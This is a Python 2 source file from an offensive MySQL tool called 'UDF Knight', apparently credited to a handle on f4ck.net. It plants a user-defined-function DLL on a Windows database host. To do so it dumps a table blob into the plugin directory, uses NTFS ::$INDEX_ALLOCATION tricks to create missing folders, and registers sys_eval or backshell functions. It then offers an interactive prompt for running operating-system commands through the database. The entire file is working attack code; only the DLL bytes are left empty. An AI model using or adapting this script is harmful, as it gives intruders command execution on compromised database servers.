#! /usr/bin/env python
#coding=utf-8
import sys,time
from MysqlSaber_col import printWait,printError,printResult

def Sknight():
    printWait( '''
        #######################################################
        #                                                     #
        #           Mysql Saber ---- UDF Knight               #
        #               BY haxsscker#f4ck.net                 #
        #                                                     #
        #######################################################
    ''')

def Sudf(sword):
    udf = ''
    printWait( '''
            0 for check by Saber
            1 input by yourself
        ''' )
    banben = raw_input("Please choose the path(0/1): ")
    if banben == '1':
        path = raw_input("Give me the path: ")
        path = path.replace('\\','/')
    elif banben == '0':
        path = selectpath(sword)
    else:
        printError("[+Saber+]===> Hey boy, the select is wrong! And I'll check the path!")
        path = selectpath(sword)
    
    printResult("[+Saber+]===> udf's out path is : "+path)
    
    try:
        sword.execute('DROP TABLE IF EXISTS fuc_udf;')
        time.sleep(1)
        sword.execute('CREATE TABLE fuc_udf(udf BLOB);')
        sword.execute('INSERT into fuc_udf values (CONVERT(%s,CHAR));' %udf)
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!")
        return
    else:
        printWait("[+Saber+]===> udf has been inserted into the DB!!") 
    
    try:
        sword.execute('select @@basedir;')
        pathbase = sword.fetchall()
        pathbase = pathbase[0][0].replace('\\','/')
        sword.execute('select \'xxx\' into outfile \'%s/lib::$INDEX_ALLOCATION\';' %pathbase)
    except:
        pass
    try:
        sword.execute('select \'xxx\' into outfile \'%s/lib/plugin::$INDEX_ALLOCATION\';' %pathbase)
    except:
        pass

    try:
        sword.execute('SELECT udf FROM fuc_udf INTO DUMPFILE \'%s/fucudf.dll\';' %path)
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!")
        return
    if path == 'C:/RECYCLED/':
        try:
            sword.execute("create function backshell returns string soname 'C:/RECYCLED/fucudf.dll';")
        except Exception,e:
            printError(e)
            printError("[+Saber+]===> Hey boy, what's wrong?!")
            return
        else:
            printResult("[+Saber+]===> UDF Knight has done its job!!")
            printWait("[+Saber+]===> try some command just like \"ipconfig\"")
            sword.execute('DROP TABLE IF EXISTS fuc_udf;')         
    else:
        try:
            sword.execute("create function sys_eval returns string soname 'fucudf.dll';")
        except Exception,e:
            printError(e)
            printError("[+Saber+]===> Hey boy, what's wrong?!")
            return
        else:
            printResult("[+Saber+]===> UDF Knight has done its job!!")
            printWait("[+Saber+]===> try some command just like \"ipconfig\"")
            sword.execute('DROP TABLE IF EXISTS fuc_udf;') 

def Sudfsql(sword,sql):
    try:
        sql = "select sys_eval(\""+sql+"\");"
        sword.execute(sql)
        query = sword.fetchall()
        for i in query:
            for j in i:
                print str(j)+"\n"
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, the SQL is wrong!")
    else:
        printResult("[+Saber+]===> DONE! ")
        
def selectpath(sword):
    sword.execute('select version();')
    version = sword.fetchall()
    version = version[0][0]
    if version[0] < 5:
        path = 'C:/RECYCLED/'
    elif version[2] == 0 :
        path = 'C:/windows/'
    else:
        try:
            sword.execute('select @@plugin_dir;')
            basedir = sword.fetchall()
            basedir = basedir[0][0].replace('\\','/')
        except Exception,e:
            printError(e)
            printError("[+Saber+]===> Hey boy, what's wrong?!")
            return
        else:
            path = basedir  
    return path
    

def main(sword):
    Sudf(sword)
    sql = ''
    while sql != 'q':
        sql = raw_input("enter your command here/(press q to exit): ")
        if sql != 'q':  
            Sudfsql(sword,sql)
    printWait("[+Saber+]===> Quit udf and use other function? ")
    scontinue = 'y'
    scontinue = raw_input("continue?(y/n): y?")
    if scontinue == 'n':
        sword.close()
        sys.exit()
